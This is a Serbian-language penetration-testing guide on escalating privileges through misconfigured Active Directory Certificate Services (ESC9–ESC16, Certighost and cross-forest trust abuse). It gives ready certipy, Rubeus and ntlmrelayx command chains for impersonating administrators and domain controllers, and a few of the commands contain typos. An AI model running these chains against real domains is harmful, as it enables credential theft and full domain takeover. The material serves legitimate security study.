[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Bez bezbednosne ekstenzije - ESC9 <a href="#id-5485" id="id-5485"></a>

### Objašnjenje

Nova vrednost **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) za **`msPKI-Enrollment-Flag`**, poznata kao ESC9, sprečava ugrađivanje **nove bezbednosne ekstenzije `szOID_NTDS_CA_SECURITY_EXT`** u sertifikat. Ova zastavica postaje relevantna kada je `StrongCertificateBindingEnforcement` podešen na `1` (podrazumevana vrednost), za razliku od podešavanja `2`. Njena važnost je veća u scenarijima u kojima bi slabije mapiranje sertifikata za Kerberos ili Schannel moglo biti iskorišćeno (kao kod ESC10), jer odsustvo ESC9 ne bi promenilo zahteve.<sup>[[7]](#references)</sup>

Uslovi pod kojima podešavanje ove zastavice postaje značajno uključuju:

- `StrongCertificateBindingEnforcement` nije podešen na `2` (podrazumevana vrednost je `1`), ili `CertificateMappingMethods` uključuje zastavicu `UPN`.
- Sertifikat ima postavljenu zastavicu `CT_FLAG_NO_SECURITY_EXTENSION` u okviru podešavanja `msPKI-Enrollment-Flag`.
- Sertifikat navodi bilo koji EKU za client authentication.
- Dostupne su `GenericWrite` dozvole nad bilo kojim nalogom kako bi se kompromitovao drugi nalog.

### Scenario zloupotrebe

Pretpostavimo da `John@corp.local` ima `GenericWrite` dozvole nad nalogom `Jane@corp.local`, sa ciljem kompromitovanja naloga `Administrator@corp.local`. Šablon sertifikata `ESC9`, u koji `Jane@corp.local` ima pravo upisa, konfigurisan je sa zastavicom `CT_FLAG_NO_SECURITY_EXTENSION` u okviru podešavanja `msPKI-Enrollment-Flag`.

Najpre se hash naloga `Jane` dobija pomoću Shadow Credentials, zahvaljujući `GenericWrite` dozvolama koje poseduje `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Nakon toga, `userPrincipalName` korisnika `Jane` menja se u `Administrator`, namerno izostavljajući deo domena `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Ova izmena ne krši ograničenja, s obzirom na to da `Administrator@corp.local` ostaje različit kao `userPrincipalName` korisnika `Administrator`.

Nakon toga, ranjivi template sertifikata `ESC9` zatražen je kao `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Primećeno je da `userPrincipalName` sertifikata odražava `Administrator`, bez ikakvog „object SID“-a.

`userPrincipalName` naloga `Jane` zatim se vraća na originalnu vrednost, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Pokušaj autentifikacije pomoću izdatog sertifikata sada daje NT hash naloga `Administrator@corp.local`. Komanda mora da sadrži `-domain <domain>` zbog toga što sertifikat ne navodi domen:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Slaba mapiranja sertifikata - ESC10

### Objašnjenje

Dve vrednosti registry ključeva na domain controlleru označavaju se kao ESC10:

- Podrazumevana vrednost za `CertificateMappingMethods` u `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` iznosi `0x18` (`0x8 | 0x10`), dok je ranije bila podešena na `0x1F`.
- Podrazumevana vrednost za `StrongCertificateBindingEnforcement` u `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` iznosi `1`, dok je ranije bila `0`.<sup>[[7]](#references)</sup>

**Slučaj 1**

Kada je `StrongCertificateBindingEnforcement` podešen na `0`.

**Slučaj 2**

Ako `CertificateMappingMethods` uključuje `UPN` bit (`0x4`).

### Abuse Case 1

Kada je `StrongCertificateBindingEnforcement` podešen na `0`, nalog A sa `GenericWrite` dozvolama može se iskoristiti za kompromitovanje bilo kog naloga B.

Na primer, ako napadač ima `GenericWrite` dozvole nad nalogom `Jane@corp.local`, cilj mu je kompromitovanje naloga `Administrator@corp.local`. Procedura je ista kao kod ESC9, što omogućava korišćenje bilo kog certificate template-a.

Najpre se hash naloga `Jane` preuzima pomoću Shadow Credentials, iskorišćavanjem `GenericWrite` dozvole.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Nakon toga, `userPrincipalName` korisnika `Jane` menja se u `Administrator`, namerno izostavljajući deo `@corp.local` kako bi se izbeglo kršenje ograničenja.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Nakon toga se zahteva sertifikat koji omogućava autentifikaciju klijenta kao `Jane`, koristeći podrazumevani template `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnika `Jane` se zatim vraća na prvobitnu vrednost, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autentifikacija sa dobijenim certificate-om će otkriti NT hash za `Administrator@corp.local`, što zahteva navođenje domena u komandi zbog odsustva informacija o domenu u certificate-u.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Slučaj zloupotrebe 2

Kada `CertificateMappingMethods` sadrži UPN bit flag (`0x4`), nalog A sa `GenericWrite` dozvolama može da kompromituje bilo koji nalog B kojem nedostaje svojstvo `userPrincipalName`, uključujući naloge računara i ugrađeni administrator domena `Administrator`.

Ovde je cilj kompromitovati `DC$@corp.local`, počevši od pribavljanja hash-a naloga `Jane` kroz Shadow Credentials, uz iskorišćavanje dozvole `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` korisnika `Jane` se zatim postavlja na `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Sertifikat za autentifikaciju klijenta zahteva se kao `Jane` koristeći podrazumevani `User` template.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` korisnika `Jane` vraća se na prvobitnu vrednost nakon ovog procesa.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Za autentifikaciju putem Schannel-a koristi se Certipy opcija `-ldap-shell`, što ukazuje na uspešnu autentifikaciju kao `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Kroz LDAP shell, komande kao što je `set_rbcd` omogućavaju napade Resource-Based Constrained Delegation (RBCD), što potencijalno može dovesti do kompromitovanja kontrolera domena.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Ova ranjivost se takođe odnosi na svaki korisnički nalog kojem nedostaje `userPrincipalName` ili se on ne podudara sa `sAMAccountName`, pri čemu je podrazumevani `Administrator@corp.local` glavna meta zbog svojih povišenih LDAP privilegija i činjenice da mu podrazumevano nedostaje `userPrincipalName`.

## Relaying NTLM to ICPR - ESC11

### Objašnjenje

Ako CA Server nije konfigurisan sa `IF_ENFORCEENCRYPTICERTREQUEST`, NTLM relay attacks se mogu izvoditi bez potpisivanja putem RPC servisa. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Možete koristiti `certipy` da proverite da li je `Enforce Encryption for Requests` podešen na `Disabled`, a certipy će prikazati `ESC11` Vulnerabilities.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Scenario zloupotrebe

Potrebno je podesiti relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Napomena: Za domain controllers, moramo navesti `-template` u DomainController.

Ili koristeći [sploutchy's fork of impacket](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell pristup ADCS CA sa YubiHSM - ESC12

### Objašnjenje

Administratori mogu da podese Certificate Authority tako da se skladišti na eksternom uređaju, kao što je "Yubico YubiHSM2".

Ako je USB uređaj povezan sa CA serverom preko USB porta, ili sa USB device serverom u slučaju da je CA server virtuelna mašina, potreban je authentication key (ponekad se naziva i "password") da bi Key Storage Provider mogao da generiše i koristi ključeve u YubiHSM-u.

Ovaj key/password je sačuvan u registry-ju pod `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` u otvorenom tekstu.

Reference su dostupne [ovde](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Scenario zloupotrebe

Ako je privatni ključ CA-a sačuvan na fizičkom USB uređaju i dobijete shell pristup, moguće je povratiti ključ.

Najpre je potrebno da nabavite CA certificate (javan je), a zatim:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Konačno, koristite certutil komandu `-sign` da izdate novi proizvoljni sertifikat koristeći CA sertifikat i njegov privatni ključ.

## OID Group Link Abuse - ESC13

### Objašnjenje

Atribut `msPKI-Certificate-Policy` omogućava dodavanje politike izdavanja u certificate template. Objekti `msPKI-Enterprise-Oid`, odgovorni za izdavanje politika, mogu se pronaći u Configuration Naming Context-u (CN=OID,CN=Public Key Services,CN=Services) PKI OID kontejnera. Politika se može povezati sa AD grupom pomoću atributa `msDS-OIDToGroupLink` ovog objekta, čime se sistemu omogućava da autorizuje korisnika koji prezentuje sertifikat kao da je član te grupe. [Referenca se nalazi ovde](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Drugim rečima, kada korisnik ima dozvolu da enroll-uje sertifikat, a sertifikat je povezan sa OID grupom, korisnik može naslediti privilegije te grupe.

Koristite [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) da pronađete OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Scenario zloupotrebe

Pronađite korisničku dozvolu; za to možete koristiti `certipy find` ili `Certify.exe find /showAllPermissions`.

Ako `John` ima dozvolu za enroll nad `VulnerableTemplate`, korisnik može naslediti privilegije grupe `VulnerableGroup`.

Sve što treba da uradi jeste da navede template; dobiće certificate sa pravima `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Ranjiva konfiguracija obnavljanja sertifikata - ESC14

### Objašnjenje

Opis na https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping je izuzetno detaljan. U nastavku je citat originalnog teksta.<sup>[[14]](#references)</sup>

ESC14 se bavi ranjivostima koje nastaju zbog „slabog eksplicitnog mapiranja sertifikata“, prvenstveno usled zloupotrebe ili nebezbedne konfiguracije atributa `altSecurityIdentities` na Active Directory korisničkim ili računarskim nalozima. Ovaj atribut sa više vrednosti omogućava administratorima da ručno povežu X.509 sertifikate sa AD nalogom u svrhu autentikacije. Kada su ove eksplicitne mape popunjene, one mogu nadjačati podrazumevanu logiku mapiranja sertifikata, koja se obično oslanja na UPN-ove ili DNS imena u SAN-u sertifikata, odnosno na SID ugrađen u bezbednosnu ekstenziju `szOID_NTDS_CA_SECURITY_EXT`.

„Slabo“ mapiranje nastaje kada je vrednost stringa korišćena u atributu `altSecurityIdentities` za identifikaciju sertifikata previše široka, lako pogodiva, oslanja se na nejedinstvena polja sertifikata ili koristi komponente sertifikata koje se lako mogu lažirati. Ako napadač može da dobije ili izradi sertifikat čiji se atributi poklapaju sa tako slabo definisanim eksplicitnim mapiranjem privilegovanog naloga, može da koristi taj sertifikat za autentikaciju kao taj nalog i njegovu imitaciju.

Primeri potencijalno slabih stringova za mapiranje `altSecurityIdentities` uključuju:

- Mapiranje isključivo prema uobičajenom Common Name-u (CN-u) subjekta: npr. `X509:<S>CN=SomeUser`. Napadač bi mogao da dobije sertifikat sa ovim CN-om iz manje bezbednog izvora.
- Korišćenje previše generičkih Distinguished Name-ova (DN-ova) izdavača ili DN-ova subjekta bez dodatne kvalifikacije, kao što su određeni serijski broj ili identifikator ključa subjekta: npr. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Korišćenje drugih predvidljivih obrazaca ili nekriptografskih identifikatora koje bi napadač mogao da ispuni u sertifikatu koji može legitimno da dobije ili falsifikuje (ako je kompromitovao CA ili pronašao ranjivi template kao kod ESC1).

Atribut `altSecurityIdentities` podržava različite formate za mapiranje, kao što su:

- `X509:<I>IssuerDN<S>SubjectDN` (mapira prema punom DN-u izdavača i subjekta)
- `X509:<SKI>SubjectKeyIdentifier` (mapira prema vrednosti ekstenzije Subject Key Identifier sertifikata)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapira prema serijskom broju, implicitno kvalifikovanom DN-om izdavača) - ovo nije standardni format, već se obično koristi `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapira prema RFC822 imenu, obično imejl adresi, iz SAN-a)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapira prema SHA1 hash-u sirovog javnog ključa sertifikata - uopšteno snažno mapiranje)

Bezbednost ovih mapa u velikoj meri zavisi od specifičnosti, jedinstvenosti i kriptografske snage izabranih identifikatora sertifikata koji se koriste u stringu za mapiranje. Čak i kada su na Domain Controller-ima omogućeni snažni režimi vezivanja sertifikata (koji prvenstveno utiču na implicitna mapiranja zasnovana na SAN UPN-ovima/DNS-u i SID ekstenziji), loše konfigurisan unos `altSecurityIdentities` i dalje može predstavljati direktan put za imitaciju ako je sama logika mapiranja pogrešna ili previše permisivna.
### Scenario zloupotrebe

ESC14 cilja **eksplicitna mapiranja sertifikata** u Active Directory-u (AD), konkretno atribut `altSecurityIdentities`. Ako je ovaj atribut postavljen (namerno ili usled pogrešne konfiguracije), napadači mogu da imitiraju naloge tako što će predstaviti sertifikate koji odgovaraju mapiranju.

#### Scenario A: Napadač može da upisuje u `altSecurityIdentities`

**Preuslov**: Napadač ima dozvole za upis u atribut `altSecurityIdentities` ciljnog naloga ili dozvolu da mu ih dodeli u obliku jedne od sledećih dozvola nad ciljnim AD objektom:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Cilj ima slabo mapiranje preko X509RFC822 (imejl)

- **Preuslov**: Cilj ima slabo X509RFC822 mapiranje u altSecurityIdentities. Napadač može da postavi atribut mail žrtve tako da odgovara X509RFC822 imenu cilja, da enroll-uje sertifikat kao žrtva i da ga koristi za autentikaciju kao cilj.
#### Scenario C: Cilj ima X509IssuerSubject mapiranje

- **Preuslov**: Cilj ima slabo eksplicitno X509IssuerSubject mapiranje u `altSecurityIdentities`.Napadač može da postavi atribut `cn` ili `dNSHostName` na principalskom nalogu žrtve tako da odgovara subject-u X509IssuerSubject mapiranja cilja. Zatim napadač može da enroll-uje sertifikat kao žrtva i da koristi ovaj sertifikat za autentikaciju kao cilj.
#### Scenario D: Cilj ima X509SubjectOnly mapiranje

- **Preuslov**: Cilj ima slabo eksplicitno X509SubjectOnly mapiranje u `altSecurityIdentities`. Napadač može da postavi atribut `cn` ili `dNSHostName` na principalskom nalogu žrtve tako da odgovara subject-u X509SubjectOnly mapiranja cilja. Zatim napadač može da enroll-uje sertifikat kao žrtva i da koristi ovaj sertifikat za autentikaciju kao cilj.
### konkretne operacije
#### Scenario A

Zatražite sertifikat certificate template-a `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sačuvajte i konvertujte sertifikat
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autentifikujte se (koristeći sertifikat)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Čišćenje (opciono)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Za specifičnije metode napada u različitim scenarijima napada pogledajte sledeće: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Objašnjenje

Opis na adresi https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc je izuzetno detaljan. U nastavku je citat originalnog teksta.<sup>[[15]](#references)</sup>

Korišćenjem ugrađenih podrazumevanih certificate templates verzije 1, napadač može da izradi CSR tako da uključi application policies koje imaju prednost u odnosu na konfigurisane Extended Key Usage atribute navedene u template-u. Jedini zahtev su enrollment prava, a ovo se može koristiti za generisanje client authentication, certificate request agent i codesigning sertifikata pomoću **_WebServer_** template-a

### Zloupotreba

Sledeće je preuzeto sa [ovog linka]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Kliknite da biste videli detaljnije metode korišćenja.<sup>[[14]](#references)</sup>


Certipy-jeva `find` komanda može pomoći u identifikovanju V1 template-a koji su potencijalno podložni ESC15 ako CA nije zakrpljen.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Direktna impersonacija putem Schannel-a

**Korak 1: Zatražite sertifikat, ubacujući „Client Authentication“ Application Policy i ciljni UPN.** Attacker `attacker@corp.local` cilja `administrator@corp.local` koristeći V1 template „WebServer“ (koji dozvoljava subject koji obezbeđuje enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Ranljivi V1 template sa opcijom „Enrollee supplies subject“.
- `-application-policies 'Client Authentication'`: Ubacuje OID `1.3.6.1.5.5.7.3.2` u ekstenziju Application Policies CSR-a.
- `-upn 'administrator@corp.local'`: Postavlja UPN u SAN radi impersonation-a.

**Step 2: Authenticate putem Schannel-a (LDAPS) koristeći dobijeni sertifikat.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Korak 1: Zatražite certificate from a V1 template (sa opcijom "Enrollee supplies subject"), uz ubacivanje "Certificate Request Agent" Application Policy-ja.** Ovaj certificate je namenjen napadaču (`attacker@corp.local`) kako bi postao enrollment agent. Ovde nije naveden UPN za identitet samog napadača, jer je cilj dobijanje mogućnosti agenta.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Ubrizgava OID `1.3.6.1.4.1.311.20.2.1`.

**Korak 2: Koristite "agent" sertifikat da zatražite sertifikat u ime ciljnog privilegovanog korisnika.** Ovo je korak sličan ESC3, pri čemu se sertifikat iz Koraka 1 koristi kao agent sertifikat.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Korak 3: Autentifikujte se kao privilegovani korisnik koristeći sertifikat „on-behalf-of“.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Objašnjenje

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** odnosi se na scenario u kojem, ako konfiguracija AD CS ne zahteva uključivanje ekstenzije **szOID_NTDS_CA_SECURITY_EXT** u svim sertifikatima, napadač to može iskoristiti na sledeći način:

1. Zahtevati sertifikat **bez SID binding-a**.

2. Koristiti ovaj sertifikat za autentikaciju kao bilo koji nalog, na primer za impersonaciju naloga sa visokim privilegijama (npr. Domain Administrator).

Takođe možete pogledati ovaj članak da biste saznali više o detaljnom principu:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

Sledeće je preuzeto sa [ovog linka](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), kliknite da biste videli detaljnije metode korišćenja.<sup>[[14]](#references)</sup>

Da biste utvrdili da li je okruženje Active Directory Certificate Services (AD CS) ranjivo na **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Korak 1: Pročitajte početni UPN naloga žrtve (opciono - za vraćanje).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Korak 2: Ažurirajte UPN naloga žrtve na `sAMAccountName` ciljnog administratora.
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Korak 3: (Ako je potrebno) Nabavite kredencijale za nalog „victim“ (npr. putem Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Korak 4: Zatražite sertifikat kao korisnik „žrtva“ iz _bilo kog odgovarajućeg client authentication template-a_ (npr. „User“) na CA ranjivom na ESC16.** Pošto je CA ranjiv na ESC16, automatski će izostaviti SID security extension iz izdatog sertifikata, bez obzira na specifična podešavanja template-a za ovu ekstenziju. Podesite environment variable za Kerberos credential cache (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Zatim zatražite sertifikat:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Korak 5: Vratite UPN naloga "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Korak 6: Autentifikujte se kao ciljni administrator.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Objašnjenje

**Certighost** zloupotrebljava **AD CS enrollment chase / callback putanju**, gde CA veruje atributima zahteva koje je dostavio podnosilac, kako bi razrešio identitet koji treba da bude smešten u izdatom sertifikatu. U javnom PoC-u, posebno kreiran zahtev uključuje:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP pod kontrolom napadača koji će CA kontaktirati
- **`rmd`**: **DNS ime ciljnog Domain Controller-a** za impersonaciju

Ako CA prati taj chase, povezaće se sa napadačem preko **SMB/LSA (`445`)** i **LDAP-a (`389`)**. Napadač koristi **stvarni machine account** (obično kreiran putem podrazumevanog **`ms-DS-MachineAccountQuota`**), tako da se callback sesija autentifikuje kao važeći domen principal, ali rogue servisi umesto toga vraćaju atribute identiteta **ciljnog DC-a**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Ako CA **kriptografski ne poveže vraćeni identitet sa autentifikovanim callback principalom**, može izdati sertifikat za **Domain Controller**, iako se sesija autentifikovala korišćenjem machine account-a pod kontrolom napadača. Zbog toga se ova greška konceptualno razlikuje od **Certifried**: umesto menjanja AD atributa kao što je `dNSHostName`, napadač **zamenjuje podatke identiteta tokom callback razrešavanja u CA-u**.<sup>[[2]](#references)</sup>

**Korisni preduslovi:**

- Nisko privilegovani **domen kredencijali**
- Mogućnost **kreiranja ili ponovnog korišćenja computer account-a**
- Mrežna dostupnost **CA-a** do portova pod kontrolom napadača, **`389`** i **`445`**
- Ranljiva / nezakrpljena CA request putanja (Microsoft update od **14. jula 2026.** dodao je **DC validation za `cdc`** i **poređenje razrešenog SID-a**)

Dobijeni **`.pfx`** se zatim može koristiti za **PKINIT**, čime se dobija **`.ccache`**, a u objavljenom PoC flow-u i **NT hash ciljnog DC-a**, što je obično dovoljno za **potpun kompromis domena**.

### Abuse

Javni PoC automatizuje ceo chain:<sup>[[1]](#references)</sup>

1. Kreira ili ponovo koristi **machine account** pod kontrolom napadača.
2. Pokreće **rogue LDAP i SMB/LSA listenere** na portovima `389` i `445`.
3. Podnosi zahtev za sertifikat koji sadrži atribute **`cdc`** pod kontrolom napadača i ciljni **`rmd`**.
4. Omogućava CA-u da se autentifikuje na rogue listenerima korišćenjem kontrolisanog machine account-a, ali na identity lookups odgovara atributima **ciljnog DC-a**.
5. Prima CA-potpisani **DC sertifikat**, a zatim ga koristi za **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Korisne runtime zastavice iz PoC-a:

- `--listener <ip>`: eksplicitno bira callback IP adresu oglašenu u `cdc`
- `--computer-name <NAME$>`: ponovo koristi postojeći machine account umesto kreiranja novog

**Operativne napomene:**

- Za PoC je potreban **root** jer se vezuje za **privileged ports** `389` i `445`.
- Uspešna eksploatacija lokalno upisuje **DC `.pfx`** i **Kerberos `.ccache`**.
- Pošto se sertifikat mapira na **Domain Controller account**, naknadne radnje mogu obuhvatati **certificate-based Kerberos auth**, **DCSync** i ponovnu upotrebu dobijenog **machine NT hash**-a.<sup>[[2]](#references)</sup>

## Objašnjenje kompromitovanja šuma pomoću sertifikata u pasivnom glasu

### Narušavanje forest trust-ova pomoću kompromitovanih CA-ova

Konfiguracija za **cross-forest enrollment** relativno se jednostavno uspostavlja. **Root CA certificate** iz resource forest-a administratori **objavljuju u account forest-ovima**, dok se **enterprise CA** sertifikati iz resource forest-a **dodaju u `NTAuthCertificates` i AIA containere u svakom account forest-u**. Drugim rečima, ovim aranžmanom se **CA-u u resource forest-u daje potpuna kontrola** nad svim ostalim forest-ovima za koje upravlja PKI-jem. Ako bi ovaj CA bio **kompromitovan od strane napadača**, oni bi mogli da **krivotvore sertifikate za sve korisnike u resource i account forest-ovima**, čime bi bila narušena bezbednosna granica forest-a.<sup>[[6]](#references)</sup>

### Dodeljene enrollment privilegije stranim principal-ima

U multi-forest okruženjima, potrebna je opreznost u vezi sa Enterprise CA-ovima koji **objavljuju certificate templates** koji **Authenticated Users ili foreign principals** (korisnicima/grupama izvan forest-a kojem Enterprise CA pripada) omogućavaju **enrollment i edit prava**.\
Nakon autentikacije preko trust-a, AD dodaje **Authenticated Users SID** korisnikovom tokenu. Stoga, ako domen poseduje Enterprise CA sa template-om koji **Authenticated Users-ima omogućava enrollment prava**, korisnik iz drugog forest-a potencijalno može **da izvrši enrollment nad tim template-om**. Isto tako, ako template **izričito dodeljuje enrollment prava foreign principal-u**, time se **kreira cross-forest access-control odnos**, koji principal-u iz jednog forest-a omogućava **enrollment nad template-om iz drugog forest-a**.

